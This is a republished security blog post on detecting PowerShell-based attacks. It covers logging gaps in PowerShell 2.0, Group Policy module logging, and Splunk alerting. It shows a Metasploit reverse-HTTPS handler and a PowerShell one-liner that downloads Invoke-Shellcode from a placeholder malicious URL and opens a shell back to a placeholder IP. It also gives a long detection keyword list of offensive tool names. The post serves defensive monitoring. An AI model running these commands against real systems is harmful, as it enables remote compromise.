@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>PowerShell A Traceless Threat and How to Protect Yourself</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>PowerShell A Traceless Threat and How to Protect Yourself</h1>
+			<b><time>18.01.2016 13:23</time></b>
+		       
+
+			<div>
+				<h1 id="powershell-a-traceless-threat-and-how-to-protect-yourself">PowerShell A Traceless Threat and How to Protect Yourself</h1>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>As mentioned in an earlier post, according to <a href="http://www.verizonenterprise.com/resources/reports/rp_data-breach-investigations-report-2013_en_xg.pdf">Verizon&rsquo;s 2013 Data Breach Report</a> 76% of breaches involved stolen or weak credentials, so, to start, this post will assume that you have already been exploited and the attacker potentially has admin or domain admin credentials to focus on PowerShell as a threat vector.</p>
+<p>A huge thank you to the work done by <a href="https://www.linkedin.com/in/ryankaz">Ryan Kazanciyan</a> and <a href="https://www.linkedin.com/in/matt-hastings-78b6ba45">Matt Hastings</a> for their <a href="https://www.fireeye.com/blog/threat-research/2014/08/black-hat-usa-talks-investigating-powershell-attacks.html">research</a> on PowerShell attacks, which was the starting point and principal resource for research on this topic.</p>
+<h3 id="downloading-and-connecting-to-metasploit">Downloading and Connecting to Metasploit</h3>
+<p>Once an actor gains access to a random Windows server within your environment the first action they will typically perform is to escalate privileges. PowerSploit has a nifty PowerShell module called Invoke-ShellCode that can invoke shellcode into a running process or even PowerShell itself. So for example, you can set up a Kali Linux server with a Metasploit server listening on port 443 for incoming shellcode commands:</p>
+<pre tabindex="0"><code>Metasploit:
+msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_https
+msf exploit(handler) &gt; set LHOST &lt;Your local host&gt;
+msf exploit(handler) &gt; set LPORT 443
+msf exploit(handler) &gt; exploit
+</code></pre><p>Then you can run the following commands to download and run the PowerShell Invoke-Shellcode script (default Invoke&ndash;Shellcode in the Git repositories. That was a wasted day and a half.) This will create an HTTPS connection back to a C&amp;C Meterpreter shell, or worse:</p>
+<pre tabindex="0"><code>PowerShell:
+IEX (New-Object Net.WebClient).DownloadString(&#34;https://&lt;Malicious URL&gt;/Invoke-Shellcode.ps1&#34;)
+Invoke-ShellCode -Payload windows/meterpreter/reverse_https -Lhost &lt;malicious IP&gt; -Lport 443 -Force
+</code></pre><h3 id="event-logging">Event Logging</h3>
+<p>Because both the download and ShellCode connections are via HTTPS most perimeter IPS/AntiVirus will not inspect them. The ShellCode runs in memory and doesn&rsquo;t hit the disk, leaving it very difficult to detect by both Antiviruses and classic forensics, but the important thing to focus on here is how PowerShell logs these events while hunting. Executing the above on a Windows 2008 R2 OS with PowerShell 2.0 generates only three relevant events in the Windows PowerShell event log:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgjACjneD5MmvX3C6d-iHEQgHRUIGr_bOx0Aiz0SKPvrYF5qE_PGALT4wteV3uUGmABzwqF8BiTVPkI0DvrhkbKjG8qNLn2d8Pq47EjKY5SI-8dOvG4JeNn7UeSCQl7RI5Jl2gceq9_xPq/s1600/PowerShell+2.0+Invoke-ShellCode+Events+-+EventLog.PNG">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgjACjneD5MmvX3C6d-iHEQgHRUIGr_bOx0Aiz0SKPvrYF5qE_PGALT4wteV3uUGmABzwqF8BiTVPkI0DvrhkbKjG8qNLn2d8Pq47EjKY5SI-8dOvG4JeNn7UeSCQl7RI5Jl2gceq9_xPq/s1600/PowerShell&#43;2.0&#43;Invoke-ShellCode&#43;Events&#43;-&#43;EventLog.PNG" alt="" />
+</figure>
+
+
+</a></p>
+<p>The Windows PowerShell Event Log After Executing ShellCode in PowerShell</p>
+<p>Leaving basically three events to go by:</p>
+<p>400</p>
+<p>Engine state is changed from None to Available.</p>
+<p>403</p>
+<p>Engine state is changed from Available to Stopped.</p>
+<p>600</p>
+<p>Provider &ldquo;Certificate&rdquo; is Started.</p>
+<p>WinEventLog:Windows PowerShell</p>
+<p>There is nothing in the event logs about running a script that invokes a ShellCode backdoor to my malicious C&amp;C domain. Can you believe Windows Event Logs? Ridiculous. But security wise this is a serious concern since there is no indication of what commands or scripts were run, by whom, or what actions the system took. Running similar scripts such as Invoke-Mimikatz also produces roughly the same events from within a PowerShell context.</p>
+<p>This is a well known limitation in PowerShell 2.0; however, the challenge is that most environments run operating systems that have PowerShell 2.0 installed by default default leaving organizations who don&rsquo;t use PowerShell having little reason to upgrade. This also leaves an active hole in an organization&rsquo;s security posture towards potential threat vectors. You can&rsquo;t understand what is happening if your system won&rsquo;t tell you.</p>
+<p>PowerShell 3.0 comes with many improvements including improved logging, so running the above command on a machine with PowerShell 3.0 will give you the same three events in Windows PowerShell, but it will also give you a number of new events in both Windows-PowerShell/Operational and Windows-WinRM/Operational.</p>
+<p>403</p>
+<p>PowerShell Console Startup</p>
+<p>40961</p>
+<p>Engine state is changed from None to Available.</p>
+<p>40962</p>
+<p>PowerShell console is ready for user input</p>
+<p>Microsoft-Windows-PowerShell/Operational</p>
+<p>208</p>
+<p>The Winrm service is starting</p>
+<p>209</p>
+<p>The Winrm service started successfully</p>
+<p>211</p>
+<p>The Winrm service is stopping</p>
+<p>212</p>
+<p>The Winrm service was stopped successfully</p>
+<p>Microsoft-Windows-WinRM/Operational</p>
+<p>This is better&ndash;we are able to see that the powershell console was manually started and that the WinRM service was used in some capacity; but there is no knowledge of what scripts or commands were run or what the results of said commands were. On a side note, while running Invoke-ShellCode I mistyped the URL and received an event log 4100 with the error message &ldquo;No connection could be made because the target machine actively refused.&rdquo; More on that later, but for now the overall lack of usable events is frightening and cannot stand.</p>
+<h3 id="powershell-module-logging">PowerShell Module Logging</h3>
+<p>One option is to add logging options to the global PowerShell profile; however, profiles can be easily bypassed by adding the &ldquo;-NoProfile&rdquo; flag to your commands. The best option, however, is to enable PowerShell Module Logging in your GPO [Edit: PowerShell 3.0+ is required on the system.] To do so go to to your <strong>Group Policy Editor</strong> -&gt; <strong>Computer Configuration</strong> -&gt; <strong>Policies</strong> -&gt; <strong>Administrative Templates</strong> -&gt; <strong>Windows Components</strong> -&gt; <strong>Windows PowerShell</strong>:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuZB0iSmfsrtXpC1kKh9WjJSz9F4Cvt6k93YU0IZf02c8SPLLls1pmchIebaoUcQrh4UCZQZIt2Mhc7eKDFm-z-GPX3Ec5UP4txYf1_k_z63IB5Y_7vmCiTzAtpE6enVfBCHYkzuTJ0rvh/s1600/GPO.png">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuZB0iSmfsrtXpC1kKh9WjJSz9F4Cvt6k93YU0IZf02c8SPLLls1pmchIebaoUcQrh4UCZQZIt2Mhc7eKDFm-z-GPX3Ec5UP4txYf1_k_z63IB5Y_7vmCiTzAtpE6enVfBCHYkzuTJ0rvh/s400/GPO.png" alt="" />
+</figure>
+
+
+</a></p>
+<p>GPO Windows PowerShell Module Logging Location</p>
+<p>The Windows PowerShell section will list the Turn on Module Logging section:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsb1BVBwwp7NaI8Hg3wbQb_Xp3p8J8h1b_rxVT7nFNGOIQUxiCirBtxdoui3YH-5k_wkmiuvkcn24Qb09krFe7pA_Gn0VEqbXgZ74_MiQHjXWvXKZ1Umts-lKWzpG2-fpwu5GIzkE5rby-/s1600/GPO+1.PNG">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsb1BVBwwp7NaI8Hg3wbQb_Xp3p8J8h1b_rxVT7nFNGOIQUxiCirBtxdoui3YH-5k_wkmiuvkcn24Qb09krFe7pA_Gn0VEqbXgZ74_MiQHjXWvXKZ1Umts-lKWzpG2-fpwu5GIzkE5rby-/s400/GPO&#43;1.PNG" alt="" />
+</figure>
+
+
+</a></p>
+<p>Windows PowerShell Module Logging Modules</p>
+<p>Select Enabled and click the Modules Names: Show button:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7Eplm7M_Z0f3Hj_jaf6Kwz_Kb-47qu6ZwRKIAuyjhysisJ1kAXhCCDPkRm2YAcwR6ommVPfqFOZn3Gwm7uJy30ZBtSH9_KzSTrJ2ghPCEuRdy0N2PffOHq1ZfKz25GrkLOvc17HSaBnRO/s1600/GPO+2.png">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7Eplm7M_Z0f3Hj_jaf6Kwz_Kb-47qu6ZwRKIAuyjhysisJ1kAXhCCDPkRm2YAcwR6ommVPfqFOZn3Gwm7uJy30ZBtSH9_KzSTrJ2ghPCEuRdy0N2PffOHq1ZfKz25GrkLOvc17HSaBnRO/s400/GPO&#43;2.png" alt="" />
+</figure>
+
+
+</a></p>
+<p>Windows PowerShell Module Logging Properties</p>
+<p>From there add the lines &ldquo;<strong>Microsoft.PowerShell.*</strong>&rdquo; and &ldquo;<strong>Microsoft.WSMan.Management</strong>&rdquo;:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfQq1O1ryg8nCHILVGdAODPPj1IPdrHiVqO9MnpzFbFvlza4WKw4QNH-M3HOQrwnBFk-DNuSsqyRspOO7u4XA4PRGcyiB0Wrp-1Vbb8huyxTJxY3HER_q4ZElcgEl5ciMW-UJeF1aqDYtK/s1600/GPO+3.png">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfQq1O1ryg8nCHILVGdAODPPj1IPdrHiVqO9MnpzFbFvlza4WKw4QNH-M3HOQrwnBFk-DNuSsqyRspOO7u4XA4PRGcyiB0Wrp-1Vbb8huyxTJxY3HER_q4ZElcgEl5ciMW-UJeF1aqDYtK/s320/GPO&#43;3.png" alt="" />
+</figure>
+
+
+</a></p>
+<p>Module Logging for PowerShell and WSMan</p>
+<p>Now, let&rsquo;s try the remote shellcode connection again:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC0b6TQ58_wavGLYIgz2GoqD5oFKHwHcGaBUG-I43yZ7Ty4SEB6dWQtmDesz0UzV436stIOrVI4UR5yKF9LmaeW8oXo6QY4wR2BpGugG6Bat7i1pw3AmSPest288q2FjmUdDuibCmTWK8E/s1600/ShellCode+Event.PNG">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC0b6TQ58_wavGLYIgz2GoqD5oFKHwHcGaBUG-I43yZ7Ty4SEB6dWQtmDesz0UzV436stIOrVI4UR5yKF9LmaeW8oXo6QY4wR2BpGugG6Bat7i1pw3AmSPest288q2FjmUdDuibCmTWK8E/s320/ShellCode&#43;Event.PNG" alt="" />
+</figure>
+
+
+</a></p>
+<p>Windows Event Log with Module Logging</p>
+<p>It worked! We can see the commands that were executed. It worked&hellip; To well. We see around 300 events&ndash;one event for each command executed in the Invoke-Shellcode script. Well this is quite troubling. You are going to need a SIEM to process this type of volume, which we will use Splunk for this scenario.</p>
+<h3 id="setting-up-splunk-for-powershell-events">Setting up Splunk for PowerShell Events</h3>
+<p>To input PowerShell events into Splunk, create a input.conf with the following stanzas:</p>
+<p>[WinEventLog://Windows PowerShell]
+disabled = false
+index = wineventlog</p>
+<p>These stanzas will read events from the Windows PowerShell event logs, which is where the PowerShell commands are saved. Alternative Windows Events that you can save for good posture are PowerShell Operational, PowerShell Analytic and WinRM Operational event logs. Use the following Stanza for each:</p>
+<p>[WinEventLog://Microsoft-Windows-PowerShell/Operational]
+disabled = false
+index = wineventlog</p>
+<p>[WinEventLog://Microsoft-Windows-PowerShell/Analytic]
+disabled = false
+index = wineventlog
+[WinEventLog://Microsoft-Windows-WinRM/Operational]
+disabled = false
+index = wineventlog</p>
+<p>So now that we have our events into Splunk we need a way to search for malicious events. First, what is a malicious event in PowerShell? I like to look for keywords used in <a href="https://gist.github.com/gfoss/">gfoss</a>&rsquo; <a href="https://gist.github.com/gfoss/2b39d680badd2cad9d82">PowerShell Command Line Logging</a> list:</p>
+<ul>
+<li>Set-ExecutionPolicy</li>
+<li>Mimikatz</li>
+<li>EncodedCommand</li>
+<li>Payload</li>
+<li>Find-AVSignature</li>
+<li>DllInjection</li>
+<li>ReflectivePEInjection</li>
+<li>Invoke-Shellcode</li>
+<li>Invoke&ndash;Shellcode</li>
+<li>Invoke-ShellcodeMSIL</li>
+<li>Get-GPPPassword</li>
+<li>Get-Keystrokes</li>
+<li>Get-TimedScreenshot</li>
+<li>Get-VaultCredential</li>
+<li>Invoke-CredentialInjection</li>
+<li>Invoke-NinjaCopy</li>
+<li>Invoke-TokenManipulation</li>
+<li>Out-Minidump</li>
+<li>Set-MasterBootRecord</li>
+<li>New-ElevatedPersistenceOption</li>
+<li>Invoke-CallbackIEX</li>
+<li>Invoke-PSInject</li>
+<li>Invoke-DllEncode</li>
+<li>Get-ServiceUnquoted</li>
+<li>Get-ServiceEXEPerms</li>
+<li>Get-ServicePerms</li>
+<li>Invoke-ServiceUserAdd</li>
+<li>Invoke-ServiceCMD</li>
+<li>Write-UserAddServiceBinary</li>
+<li>Write-CMDServiceBinary</li>
+<li>Write-UserAddMSI</li>
+<li>Write-ServiceEXE</li>
+<li>Write-ServiceEXECMD</li>
+<li>Restore-ServiceEXE</li>
+<li>Invoke-ServiceStart</li>
+<li>Invoke-ServiceStop</li>
+<li>Invoke-ServiceEnable</li>
+<li>Invoke-ServiceDisable</li>
+<li>Invoke-FindDLLHijack</li>
+<li>Invoke-FindPathHijack</li>
+<li>Get-RegAlwaysInstallElevated</li>
+<li>Get-RegAutoLogon</li>
+<li>Get-UnattendedInstallFiles</li>
+<li>Get-Webconfig</li>
+<li>Get-ApplicationHost</li>
+<li>Invoke-AllChecks</li>
+<li>Invoke-MassCommand</li>
+<li>Invoke-MassMimikatz</li>
+<li>Invoke-MassSearch</li>
+<li>Invoke-MassTemplate</li>
+<li>Invoke-MassTokens</li>
+<li>HTTP-Backdoor</li>
+<li>Add-ScrnSaveBackdoor</li>
+<li>Gupt-Backdoor</li>
+<li>Invoke-ADSBackdoor</li>
+<li>Execute-OnTime</li>
+<li>DNS_TXT_Pwnage</li>
+<li>Out-Word</li>
+<li>Out-Excel</li>
+<li>Out-Java</li>
+<li>Out-Shortcut</li>
+<li>Out-CHM</li>
+<li>Out-HTA</li>
+<li>Enable-DuplicateToken </li>
+<li>Remove-Update</li>
+<li>Execute-DNSTXT-Code</li>
+<li>Download-Execute-PS</li>
+<li>Execute-Command-MSSQL</li>
+<li>Download_Execute</li>
+<li>Get-PassHashes</li>
+<li>Invoke-CredentialsPhish</li>
+<li>Get-LsaSecret</li>
+<li>Get-Information</li>
+<li>Invoke-MimikatzWDigestDowngrade</li>
+<li>Copy-VSS</li>
+<li>Check-VM</li>
+<li>Invoke-NetworkRelay</li>
+<li>Create-MultipleSessions</li>
+<li>Run-EXEonRemote</li>
+<li>Invoke-BruteForce</li>
+<li>Port-Scan</li>
+<li>Invoke-PowerShellIcmp</li>
+<li>Invoke-PowerShellUdp</li>
+<li>Invoke-PsGcatAgent</li>
+<li>Invoke-PoshRatHttps</li>
+<li>Invoke-PowerShellTcp</li>
+<li>Invoke-PoshRatHttp</li>
+<li>Invoke-PowerShellWmi</li>
+<li>Invoke-PSGcat</li>
+<li>Remove-PoshRat</li>
+<li>TexttoEXE</li>
+<li>Invoke-Encode</li>
+<li>Invoke-Decode</li>
+<li>Base64ToString</li>
+<li>StringtoBase64</li>
+<li>Do-Exfiltration</li>
+<li>Parse_Keys</li>
+<li>Add-Exfiltration</li>
+<li>Add-Persistence</li>
+<li>Remove-Persistence</li>
+<li>Invoke-CreateCertificate</li>
+<li>powercat</li>
+<li>Find-PSServiceAccounts</li>
+<li>Get-PSADForestKRBTGTInfo</li>
+<li>Discover-PSMSSQLServers</li>
+<li>Discover-PSMSExchangeServers</li>
+<li>Get-PSADForestInfo</li>
+<li>Get-KerberosPolicy</li>
+<li>Discover-PSInterestingServices</li>
+</ul>
+<p>To search this in Splunk would be very expensive as a regex search, especially if you&rsquo;re putting this into an alert. Two options are to static-code a search of all of the above malicious values, or to create a CSV file that Splunk can use as a lookup for key words in the search. For example, create the CSV BadPowerShellCommands.csv with the heading BadPowerShellCommand and the commands in the column underneath and upload it to your /opt/splunk/etc/system/lookups folder. Now, run the search:</p>
+<p>index=wineventlog sourcetype=&ldquo;WinEventLog:Windows PowerShell&rdquo; [|inputlookup BadPowerShellCommands.csv| rename BadPowerShellCommand as search | format]</p>
+<p>This will filter your PowerShell result set with anything containing a malicious command. Next, in the search page, click the Save As button and save as Alert:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWglMfUSMpwleUYngLuLsFc9EMUwCqFHYijsj3E8ByRhNHee_a3ZskK9byk_BAvnGY9cW3UdJ5OKRDAkjyxkucyDU4D9jN0vg-58YyUEdKHuRli8xb1Ot8o7bhwg4tdCMUtYd5Cga83mBP/s1600/Save+Alert+As+1.png">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWglMfUSMpwleUYngLuLsFc9EMUwCqFHYijsj3E8ByRhNHee_a3ZskK9byk_BAvnGY9cW3UdJ5OKRDAkjyxkucyDU4D9jN0vg-58YyUEdKHuRli8xb1Ot8o7bhwg4tdCMUtYd5Cga83mBP/s400/Save&#43;Alert&#43;As&#43;1.png" alt="" />
+</figure>
+
+
+</a></p>
+<p>Splunk Search with Save option for creating an Alert</p>
+<p>Opens the Alert Creation window:</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3kAQCC2jAHCfiDH_G0W-brUG_2erKwQN2z3dyniqisDLYxk2p3OvWbHaz3vm2GNLlQVBIr4DrsRk4SbJlTk0GPrbzTD-NMwQlzdFSeMjKMafXoE6d_WaPTNsJq8nWIruLJ6R1MBGBmXQG/s1600/Save+Alert+As+2.png">
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3kAQCC2jAHCfiDH_G0W-brUG_2erKwQN2z3dyniqisDLYxk2p3OvWbHaz3vm2GNLlQVBIr4DrsRk4SbJlTk0GPrbzTD-NMwQlzdFSeMjKMafXoE6d_WaPTNsJq8nWIruLJ6R1MBGBmXQG/s400/Save&#43;Alert&#43;As&#43;2.png" alt="" />
+</figure>
+
+
+</a></p>
+<p>Alert creation screen</p>
+<p>Depending on your environment you may need to play with the scenarios that you alert on, such as if your administrators are heavy PowerShell users you may want to whitelist your administrators until off hours/non-change window periods. I would also monitor for the command &ldquo;Enable-PSRemoting&rdquo; since this command enables the ability to remotely execute PowerShell commands on a local machine. Only administrators with a purpose should enable this feature.</p>
+<p>Finally, depending on if your environment doesn&rsquo;t use PowerShell you can look for interactive PowerShell commands (or maybe just during off hours/non-change windows) such as &ldquo;Invoke-Command&rdquo; and &ldquo;Enter-PSSession&rdquo;.</p>
+<h4 id="source"><a href="https://www.redblue.team/feeds/4213481668373753553/comments/default">Source</a></h4>
+<!-- raw HTML omitted -->
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-laser-harp-sets-the-tone/">Laser Harp Sets the Tone</a></li>
+				
+				<li><a href="/posts/2025-03-20-arduino-device-helps-split-the-g-on-a-p/">Arduino device helps split the G on a pint of Guinness</a></li>
+				
+				<li><a href="/posts/2025-03-20-the-70-best-early-amazon-spring-sale-ga/">The 70 best early Amazon Spring Sale gaming deals 2025</a></li>
+				
+				<li><a href="/posts/2025-03-20-tomorrow-and-tomorrow-and-tomorrow-info/">Tomorrow and tomorrow and tomorrow Information security and the Baseball Hall of Fame</a></li>
+				
+				<li><a href="/posts/2025-03-20-i-found-an-android-phone-that-can-convi/">I found an Android phone that can convince iPhone users to make the switch - and its not a flagship</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
